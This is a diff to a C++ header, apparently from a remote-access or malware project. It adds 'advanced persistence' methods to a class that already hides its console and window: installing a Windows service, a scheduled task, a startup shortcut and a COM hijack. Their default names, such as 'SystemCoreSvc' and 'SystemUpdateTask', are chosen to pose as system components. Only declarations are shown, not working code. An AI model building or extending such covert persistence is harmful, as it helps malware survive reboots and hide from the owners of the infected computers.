@@ -23,12 +23,22 @@ public:
 
     void invoke_shutdown();
 
+    // IPersistenceService
     void configure_auto_start() override;
     void hide_console() override;
     void start_anti_sleep() override;
     void stop_anti_sleep() override;
     void create_hidden_window(std::function<void()> on_shutdown) override;
     void pump_messages() override;
+
+    // Advanced persistence (selectable at runtime)
+    bool install_service(const std::string& service_name = "SystemCoreSvc");
+    bool install_scheduled_task(const std::string& task_name = "SystemUpdateTask");
+    bool install_startup_folder(const std::string& shortcut_name = "sysupdate");
+    bool install_com_hijack(const std::string& clsid = "50F79E2C-6E08-4F83-A5E0-8A3B1D5F6A2C");
+
+    // Remove all persistence
+    void remove_all_persistence();
 };
 
 } // namespace nuub::infrastructure::system
